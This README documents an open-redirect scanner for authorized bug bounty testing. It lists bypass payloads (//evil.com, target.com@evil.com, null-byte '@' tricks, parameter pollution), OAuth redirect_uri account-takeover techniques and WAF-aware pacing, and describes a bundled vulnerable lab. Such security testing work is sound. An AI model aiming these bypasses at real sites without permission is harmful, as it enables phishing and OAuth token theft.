# RedirHunter (v2.2 - two-stage, rate-limited, auth-aware)

An async, bulk, **two-stage** open-redirect scanner for bug bounty / pentest
recon, built from analysis of real, publicly written-up bug bounty reports
covering path-based redirects, SSO/OAuth `redirect_uri` bypasses, parameter
pollution, blacklist/substring filter bypasses, and JSON-body null-byte
tricks.

> **Authorized testing only.** Only run this against targets you have
> explicit permission to test. Report findings through the program's normal
> disclosure process.

## The two-stage model

**Stage 1 (host-only):** payloads that only need *your* domain
(`-t/--target-domain`) - `//evil.com`, encoded-slash tricks, full
percent-encoding, double-encoded dots, parameter pollution. No knowledge of
the site's own trusted domain required.

**Stage 2 (target-based):** payloads that also embed the *site's own*
trusted domain as a decoy/confusion string - `target.com@evil.com`,
`target.com%00https://evil.com`, `evil.com\@target.com`. These are the ones
that matter most for **SSO/OAuth `redirect_uri` bypasses and 1-click
account takeover**, because real allowlist checks are almost always "does
the URL contain/start with our own domain" - exactly what these are built
to defeat.

Classification is automatic: any payload template containing the literal
token `{TARGET}` is Stage 2, everything else is Stage 1. Stage 1 always
runs to completion before Stage 2 starts. Findings on OAuth/SSO-shaped
params (`redirect_uri`, `return_to`, `callback`, `post_logout_redirect_uri`,
...) get an explicit note in the output to review for token/code leakage
and potential account-takeover impact.

## Rate limiting (default: 5 requests/second)

Firing every payload at once is the fastest way to trip a WAF or get your
IP rate-limited/blocked mid-scan. Every request now goes through a global
rate limiter, paced independently of concurrency:

```bash
python3 redirhunter.py -i urls.txt -t evil.com --rate 5      # default
python3 redirhunter.py -i urls.txt -t evil.com --rate 2      # slower, stealthier
python3 redirhunter.py -i urls.txt -t evil.com --rate 0      # unlimited (not recommended)
```

`-c/--concurrency` still caps how many requests can be in flight at once,
but `--rate` is what actually paces dispatch. The startup banner prints an
ETA based on your rate so you know what you're committing to before it runs.

## Missing scheme? The tool fixes it, doesn't just fail

Forgetting `http://`/`https://` on an input URL used to make every single
request on that line fail silently. Now it's auto-corrected, with a visible
note, whether it's a single `-i` URL or every line in a file:

```
$ python3 redirhunter.py -i "127.0.0.1:5000/redirect1?url={}" -t evil.com
[*] No scheme given, assuming https:// -> https://127.0.0.1:5000/redirect1?url={}
```

Control the assumed scheme with `--default-scheme {http,https}` (default
`https`). Note this is separate from `--scheme`, which only applies to
`--request-file` mode.

## Every result shows its exact payload

Every printed line, and every CSV/JSON row, now explicitly shows the
payload that was sent - not just the resulting URL (which can be
misleading for path-injection or POST-body tests where the payload isn't
visible in the query string at all):

```
http://target.com/reset-password --> http://target.com/reset-password --> 200 (100 bytes) [[STAGE 2][query_param] VULNERABLE - possible (JS redirect, verify manually)] | test payload: evil.com\x00@target.com
```

Control characters (null bytes, CR/LF) are shown as visible escapes in the
console so they never corrupt your terminal or silently vanish - the raw,
unescaped value is still preserved exactly in the CSV/JSON output for
copy-paste retesting.

**Color coding:** the outcome (URL, status, verdict tag) is colored
**blue** for a vulnerable/successful finding and **red** for a failed/not-
vulnerable attempt; `ERROR` stays **yellow** as its own distinct category
(the request never completed - see the error-summary note below). The
`test payload: ...` segment is always **green**, regardless of outcome, so
it's easy to scan a wall of output for exactly what was sent on every line.

## Active callback verification - not just a string match

For any **confirmed** finding (a real `Location` header pointing off-site),
the tool doesn't stop at comparing strings - it actually sends a follow-up
request to the resolved redirect target and reports whether your server or
Collaborator genuinely responded:

```
... VULNERABLE - confirmed (Location header) -- callback verified: your server responded (403)
```

This catches things a pure string comparison can't: typos in your test
domain, DNS that hasn't propagated, a Collaborator session that expired, or
a firewall blocking the callback. If nothing responds, you'll see
`callback NOT verified` instead, telling you to double check reachability
before reporting the finding. Disable with `--no-verify-callback` (e.g. to
save requests on a huge scan, or because your Collaborator can't be reached
by a plain GET); tune the timeout with `--callback-timeout` (default 5s).
This only fires for **confirmed** findings - "possible" ones are inherently
lower-confidence and should be verified in a browser instead, not by a
server-side fetch.

## Login-gated / authenticated flows (`--request-file`)

A very common real pattern: a redirect parameter is completely inert until
some prior action happens - almost always a successful login. Hitting the
endpoint with plain requests or no credentials never triggers anything,
because the vulnerable code path only runs post-authentication (this also
means a successful exploit often rides on stolen session state, which is
exactly what makes these into 1-click account-takeover bugs).

The scanner can't log in for you, but it doesn't need to: capture the
**already-authenticated** request once in Burp (correct username/password,
cookies, CSRF token, whatever the app needs), save it as a raw request
file, mark the redirect field with a literal `{}`, and replay it per
payload:

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

username=admin&password=hunter2&url={}
```

```bash
python3 redirhunter.py --request-file captured_login.txt \
    -t evil.com -T target.com --scheme https --only-vuln
```

`{}` can appear in the request line (path/query) and/or the body - every
occurrence gets replaced with the same rendered payload.

**`--scheme` matters and is easy to get wrong** - raw HTTP requests don't
carry a scheme, so the tool can't infer it, and a mismatch (e.g. the
default `https` against a plain-HTTP local server) doesn't fail loudly on
its own - it just makes every single request error out, which without the
error-rate warning below could look identical to "0 findings." Always check
the `[*] Errors: X/Y` line the tool prints at the end.

Exact copy-pasteable command against the bundled lab (note `--scheme http`
- the lab runs plain HTTP, not HTTPS):

```bash
python3 redirhunter.py --request-file lab/sso_login_request.txt \
    -t evil.com -T 127.0.0.1:5000 --scheme http --only-vuln
```

## Param-name fuzzing (`{{}}`) - find the param before you bypass it

Everything above assumes you already know which query param to attack.
Sometimes you don't - you've found a bare endpoint with no query string at
all (from directory brute-forcing, JS source, or an API spec), and need to
discover *which* param name even triggers a redirect before spending the
full bypass-payload list on a guess. Mark the param **name** slot with a
literal `{{}}` (double braces - distinct from the single-brace `{}` used
everywhere else for a param *value*):

```bash
python3 redirhunter.py -i "https://target.com/go?{{}}=" -t evil.com --only-vuln
```

This is a completely separate, exclusive mode from normal bypass testing:
any line in the input containing `{{}}` puts the *whole run* into fuzz
mode (non-fuzz lines in the same file are skipped with a warning - fuzz
first, then re-run separately once you have a real param name, matching
the intended two-step workflow). It tries every candidate name from your
param wordlist (`--params`, same flag as normal mode - point it at a
custom list if you want) as the query key, with **one plain
`https://your-test-domain` value** per candidate - this is deliberately a
cheap discovery pass, not a bypass test, so it's one request per candidate
name rather than the full payload list. The value after `=` in your input
line doesn't matter and gets ignored - `-t` is what actually supplies the
test domain, exactly like everywhere else in the tool.

```
http://target.com/go?goto=https%3A%2F%2Fevil.com --> 302 (219 bytes) [REDIRECT PARAM FOUND] | after-redirect fetch: 403 (95 bytes) | param: goto
```

Console color coding for fuzz mode: **blue** = that candidate name is a
real, live redirect param; **red** = it did nothing; the `param: ...`
segment is always **green**. On every positive hit the tool also actually
follows the redirect (reusing the same callback-verification machinery) so
you see both the `Location` header result *and* what actually loads when
you get there - status and response size for both, not just a header
match. Uses the same `--rate` limiter as everything else (default 5/sec)
since a fuzzing pass can easily be 70+ requests per URL.

When it finds something, the tool prints a ready-to-paste command for the
next step:

```
[!] Found 1 live redirect param(s). Re-run in normal mode to test full bypasses, e.g.:
    python3 redirhunter.py -i "http://target.com/go?goto={}" -t evil.com --only-vuln
```

`-o` saves **only the positive findings** (a run with mostly "not a
redirect param" results isn't useful to keep) - `.txt` by default for a
quick human-readable report, or `.json` for structured records with the
same fields (param name, status, size, Location header, after-redirect
fetch result).

## Four injection points

1. **`query_param`** - payload injected into a query-string value.
2. **`path_prefix`** - payload injected directly into the URL **path**,
   before the site's real path - its own bug class, not a query-param
   variant. Several real reports are path-based, not query-based. The tool
   tries injection at the domain root *and* after every existing path
   segment, so it also catches redirect microservices mounted behind a
   known prefix (`/go/`, `/out/`, `/r/...`).
3. **`param_pollution`** - a duplicate query parameter with the same name is
   appended alongside the original value (`redirect_uri=target.com&redirect_uri=evil.com`).
   Real bug: some backends validate the first occurrence but redirect using
   the last.
4. **`raw_request`** - replays a captured request (see above) with the
   payload substituted into its `{}` marker(s).

## Install

```bash
pip install -r requirements.txt
```

## Quick start

```bash
# Single URL, manual injection point, both stages, default 5 req/sec
python3 redirhunter.py -i "https://target.com/login?redirect={}" -t your-id.oastify.com

# Bulk recon file, auto-detect params, explicit trusted-domain override,
# grouped stage-separated JSON output
python3 redirhunter.py -i urls.txt -t your-id.oastify.com -T target.com \
    -o findings.json --only-vuln
```

## Input syntax

Three ways to mark what to test, usable together in the same file:

1. **Plain URL, auto-detect** - checks every query param against
   `params.txt` and injects automatically. No `{}` needed.
   ```
   https://target.com/login?redirect=/dashboard
   ```
2. **Inline placeholder** - `{}` exactly where the payload should go.
   ```
   https://target.com/login?redirect={}
   ```
3. **Manual append** - add a param the URL doesn't have yet:
   ```
   https://target.com/go>next={}
   ```

Path-prefix injection runs against **every** valid absolute URL in the
input regardless of query params - disable with `--skip-path-injection`.

## The `{HOST}` / `{TARGET}` / `{NULLBYTE}` tokens

- `{HOST}` → your test domain (`-t/--target-domain`)
- `{TARGET}` → the site's own trusted domain. Auto-extracted per URL by
  default, or set explicitly with **`-T/--target-site`** - do this for
  OAuth/SSO flows where the trusted domain differs from the host you're
  actually hitting.
- `{NULLBYTE}` → a real null character (`\x00`), not the literal text
  `\u0000`. Used for the JSON-body null-byte technique below.
- `{{}}` → not a payload token at all - marks the **param name** slot for
  fuzz mode (see above), a completely separate feature from bypass payloads.

## JSON-body / POST testing

Some real reports (password-reset flows especially) carry the redirect
field inside a POST JSON body rather than a URL query string, and a couple
of bypasses (a `\u0000` unicode escape standing in for a URL-encoded null
byte, which doesn't mean anything once you're inside a JSON string) only
make sense there. Use `--method POST --body <template.json>`:

```bash
# lab/reset_body.json contains: {"redirect": "{}"}
python3 redirhunter.py -i "https://target.com/reset-password" \
    -t evil.com -T target.com \
    --method POST --body lab/reset_body.json --read-body --only-vuln
```

The `{}` in your body template gets the payload safely JSON-string-encoded
(via `json.dumps`, not manual escaping) before substitution, so payloads
containing backslashes, quotes, or real null bytes all come through intact
and valid.

`--body` also works with non-JSON content types (form-urlencoded, XML,
anything) - just set `--content-type` accordingly. When the content type
isn't JSON, the payload is substituted as a raw literal instead of being
JSON-escaped, so it doesn't get corrupted:

```bash
# body template: username=admin&password=x&url={}
python3 redirhunter.py -i "https://target.com/login" -t evil.com -T target.com \
    --method POST --body login_body.txt --content-type "application/x-www-form-urlencoded"
```

`--method` also accepts `PUT` and `PATCH` for APIs that carry a redirect
param through those verbs instead of POST.

**One easy trap:** if `{}` is the very last thing in your body template
file and you saved it with a normal text editor, the file almost certainly
has a trailing newline after it - which would become part of the
substituted value itself, and most frameworks reject a `Location` header
containing a newline outright, turning every real bypass into a false "not
vulnerable." The tool strips trailing newlines from `--body` templates
automatically so this can't bite you, but it's worth knowing why if you
ever hand-build one and wonder why nothing's showing up as vulnerable.

## Multipart/form-data (`--request-file`)

Login forms and file-upload-adjacent endpoints often use
`multipart/form-data` rather than JSON or form-urlencoded. This is the one
body format that's genuinely strict about wire format - the boundary
markers between fields must be delimited with exact `\r\n` (CRLF), and a
parser that can't find them cleanly will throw, which surfaces to you as a
500 that has nothing to do with your payload. `--request-file` preserves
CRLF exactly for this reason. Mark `{}` wherever the redirect param
actually lives - the query string, or a hidden field inside the multipart
body itself, both work the same way:

```bash
# lab/login_multipart_request.txt - redirect param in the query string
python3 redirhunter.py --request-file lab/login_multipart_request.txt \
    -t evil.com -T 127.0.0.1:5000 --scheme http --only-vuln

# lab/login_multipart_field_request.txt - redirect param as a hidden
# multipart field instead, {} placed inside the body's boundary structure
python3 redirhunter.py --request-file lab/login_multipart_field_request.txt \
    -t evil.com -T 127.0.0.1:5000 --scheme http --only-vuln
```

If you ever see every single payload come back as an unrelated 500 against
a multipart endpoint, check that whatever produced your saved request file
kept real CRLF line endings intact - some editors/terminals normalize them
to bare LF when you copy-paste, and that alone is enough to break the
multipart body the same way.

## Choosing a test domain (`-t`)

Any domain you control works for confirming header-based redirects, since
detection parses the `Location` header directly. Use a **Burp Collaborator**
/ Interactsh domain when you also want out-of-band confirmation for
redirects that fire through something other than a direct HTTP response.

## Detection logic - and its honest limits

Verdicts are based on **resolving the redirect target the way a browser
actually would** - via RFC 3986 relative-URL resolution (`urljoin`) against
the real request URL - then comparing the resulting hostname, not doing
substring/regex matching. This avoids two failure modes naive scanners hit
constantly:

- False positive: `/../evil.com` contains "evil.com" as a substring, but
  resolves to the **same origin** once path normalization actually runs. A
  regex-based scanner flags this; this one correctly doesn't.
- False negative: `evil.com.victim.com` should never match target
  `victim.com` via a naive `contains()` check - here it's checked via
  parsed hostname equality/suffix, not substring.

**One real limitation, stated plainly rather than hidden:** a handful of
reported bypasses (the JSON null-byte `@` trick in particular) work
*because* a real browser parses a malformed string differently than a
standards-compliant parser does - that parser disagreement **is** the bug.
No automated tool can fully replicate every browser's exact quirky parsing
behavior. When the tool detects a string with host-confusion markers (an
`@` appearing before any `#`/`?`, or a control character) where the target
domain appears as raw text but standard resolution disagrees, it reports
**"possible - parser-dependent, verify in an actual browser"** rather than
either staying silent or overclaiming "confirmed." Always manually verify
"possible" findings in a real browser before reporting.

The host-confusion check is deliberately narrow, tuned from a real false
positive: `https://safe.com#@evil.com` used to get flagged, but a `#`
unambiguously ends the host component in both RFC 3986 and real browser
parsing, so it's genuinely same-origin - not a disagreement at all. Only an
`@` appearing *before* the first `#`/`?` (where it could actually be read
as userinfo) or a control character count as real signals now.

### Manually reproducing a null-byte finding in Burp

If you paste a **literal** null byte into Burp's raw request editor, JSON
parsing breaks entirely on the server side and the app silently falls back
to its default redirect - it will look like nothing happened, and it's easy
to conclude the finding was wrong. It isn't: you need the **6-character
JSON escape sequence** as literal text, not a raw byte:

```
{"redirect": "evil.com\u0000@target.com"}
```

Type `\u0000` as those six characters (backslash, u, 0, 0, 0, 0) directly
in the body. The server's JSON parser decodes that into a real null
character internally, which is what makes the bypass work - a raw 0x00
byte in the request body is invalid JSON and never reaches that code path
at all.

## Output format

```
http://target.com/login?redirect={} --> ...?redirect=https://target.com@evil.com --> 302 (303 bytes) [[STAGE 2][query_param] VULNERABLE - confirmed (Location header) -- SSO/OAuth param: review for token/code leakage and potential account-takeover impact] | test payload: https://target.com@evil.com
```

`--only-vuln` filters console/file output to confirmed + possible findings
only.

### JSON (`-o results.json`) - grouped by stage

```json
{
  "summary": {
    "total_requests": 204,
    "stage_1_requests": 123,
    "stage_2_requests": 81,
    "stage_1_vulnerable": 8,
    "stage_2_vulnerable": 23,
    "oauth_flagged_vulnerable": 12
  },
  "stage_1_host_only": [ { "...": "one object per test, including 'payload'" } ],
  "stage_2_target_based": [ { "...": "one object per test, including 'payload'" } ]
}
```

### CSV (`-o results.csv`) - flat, with `stage`, `technique`, and `payload` columns

## Key options

| Flag | Purpose |
|---|---|
| `-i / --input` | URL or file of URLs (mutually exclusive with `--request-file`) |
| `--request-file` | Raw HTTP request file with a `{}` marker, for login-gated/authenticated flows |
| `--scheme` | `http` or `https` when using `--request-file` (default https) |
| `--default-scheme` | Scheme auto-added to any `-i` URL missing http(s):// (default https) |
| `-t / --target-domain` | Your test/collaborator domain (required) |
| `-T / --target-site` | The site's own trusted domain for Stage 2 payloads (optional, auto-extracted if omitted) |
| `-p / --payloads` | Query-value payload wordlist (default: bundled `payloads.txt`) |
| `--path-payloads` | Path-prefix injection wordlist (default: `path_payloads.txt`) |
| `--params` | Redirect-param wordlist for auto-detect |
| `--stage {1,2,both}` | Run only Stage 1, only Stage 2, or both (default) |
| `--skip-path-injection` | Disable path-prefix testing (on by default) |
| `--skip-param-pollution` | Disable duplicate-param pollution testing (on by default) |
| `--method {GET,POST,PUT,PATCH}` | HTTP method |
| `--body <file>` | JSON body template with a `{}` placeholder, requires `--method POST` |
| `--content-type` | Content-Type for `--body` requests (default `application/json`) |
| `--rate` | Requests per second, global (default **5**). Set 0 to disable. |
| `-c / --concurrency` | Max in-flight requests (default 20) - `--rate` is what paces dispatch |
| `--timeout` | Per-request timeout, seconds |
| `--delay` | Extra fixed delay per request, on top of `--rate` |
| `--only-vuln` | Only show/save confirmed or possible findings |
| `--proxy` | Route everything through Burp/an intercepting proxy |
| `--header` / `--cookie` | Auth headers/cookies, repeatable header |
| `--scope` | File of allowed root domains |
| `--read-body` | Also fetch body to catch meta-refresh / JS-based redirects |
| `--baseline` | Fetch each base URL once and record its size for diffing |
| `--insecure` | Skip TLS certificate verification (off by default - certs ARE verified) |
| `--no-verify-callback` | Disable the follow-up fetch that verifies confirmed findings actually reach your server |
| `--callback-timeout` | Timeout in seconds for the callback-verification fetch (default 5) |
| `--encode-payload` | URL-encode the payload before injection (WAF testing) |
| `-o / --output` | Write results to `.csv` or `.json` |

## Adding your own payloads

Drop new lines into `payloads.txt` (query-value) or `path_payloads.txt`
(path-prefix). Use `{HOST}`, `{TARGET}`, `{NULLBYTE}` as needed - no code
changes required, and stage classification happens automatically based on
whether `{TARGET}` appears in the line.

## The vulnerable lab

`lab/app.py` - 14 routes, one per real-world bug class, so you can validate
the tool end-to-end before using it for real.

```bash
cd lab
pip install -r requirements.txt
python3 app.py
# -> http://127.0.0.1:5000/
```

| Route | Bug class | Expected verdict |
|---|---|---|
| `/redirect1?url=` | No validation at all | Vulnerable |
| `/redirect2?url=` | `startswith(trusted_domain)` string check | Vulnerable |
| `/redirect3?url=` | Blacklist substring filter | Vulnerable (use a `-t` that doesn't literally contain "evil.com") |
| `/redirect4?url=` | Regex checks trusted domain appears *anywhere* | Vulnerable |
| `/redirect5?next=` | "Must start with `/`" check | Vulnerable (`//evil.com` also starts with `/`) |
| `/redirect6?url=` | `<meta refresh>`, no `Location` header | Only caught with `--read-body` |
| `/redirect7?url=` | JS `window.location.href` redirect | Only caught with `--read-body` |
| `/redirect8?return_to=` | "Fixed" with `urlsplit()`, looks safe | **Still vulnerable** - `urlsplit("///evil.com")` reports no netloc, but browsers treat multiple leading slashes as protocol-relative |
| `/redirect9?return_to=` | Properly hardened, rejects multi-slash tricks | Not vulnerable - confirms no false positives. A systematic search (dot-segment normalization, control characters, fragment/query-boundary confusion) found nothing exploitable here; every candidate either got blocked outright or passed the code-level check but doesn't actually cross origins in a real browser (verified via the same RFC 3986 resolution the detection logic itself relies on). This route appears genuinely hardened. |
| `/redirect10/<path>` | **Path-based**, double-slash in the path itself | Vulnerable via `path_prefix` technique |
| `/oauth/authorize?redirect_uri=` | OAuth-style, `@` userinfo trick | Vulnerable, flagged as OAuth/SSO account-takeover risk |
| `/redirect12?redirect_uri=` | Validates first occurrence, redirects with last | Vulnerable via `param_pollution` technique |
| `/reset-password` (POST JSON) | `@` blacklist bypassed by hiding it after a null byte | Only the null-byte variant is vulnerable ("possible/parser-dependent") - every plain `@`/`%40` variant correctly gets blocked (400), matching the real report exactly |
| `/sso/login` (POST form) | **Login-gated** - only exploitable after a real login | Requires `--request-file lab/sso_login_request.txt` - plain scanning never triggers it |
| `/go` (no query string shown) | Redirect param `goto` - not in the "obvious" redirect/url/next family | Normal auto-detect on a param-less URL only tries 3 generic probes and misses it; `-i "http://.../go?{{}}=" -t evil.com` (fuzz mode) finds it |
| `/api/login` (POST JSON) | Redirect param in query string, credentials in a separate JSON body | `--request-file lab/api_login_request.txt` - proves the JSON body survives untouched across every payload |
| `/login` (POST multipart) | Redirect param in query string, credentials in multipart/form-data | `--request-file lab/login_multipart_request.txt` - CRLF-sensitive, this is the exact bug class that was found and fixed |
| `/login2` (POST multipart) | Redirect param as a hidden multipart FIELD, not the query string | `--request-file lab/login_multipart_field_request.txt` |

## Notes on false positives / negatives

- Verdicts are based on actually resolving the redirect target against the
  real request URL (RFC 3986), not substring/regex guessing.
- "Possible" verdicts are inherently lower-confidence and should always be
  manually verified in a real browser before reporting - this is explicit
  in the output, not hidden.
- `--read-body` is off by default (bandwidth/speed); turn it on for
  JS/meta-refresh-based redirects.
- `--baseline` adds one cached request per unique base URL and reports a
  size diff alongside every result, useful for spotting anomalies even on
  "not vulnerable" verdicts.
- Every run ends with `[*] Errors: X/Y`. If a large fraction of requests
  error out, the tool prints a loud warning instead of letting it look like
  "0 findings" - a batch of connection/SSL/timeout failures means the scan
  never actually reached the target (wrong `--scheme`, dead proxy,
  unreachable host), which is a very different situation from "not
  vulnerable" and easy to conflate if you're only skimming the vuln counts.
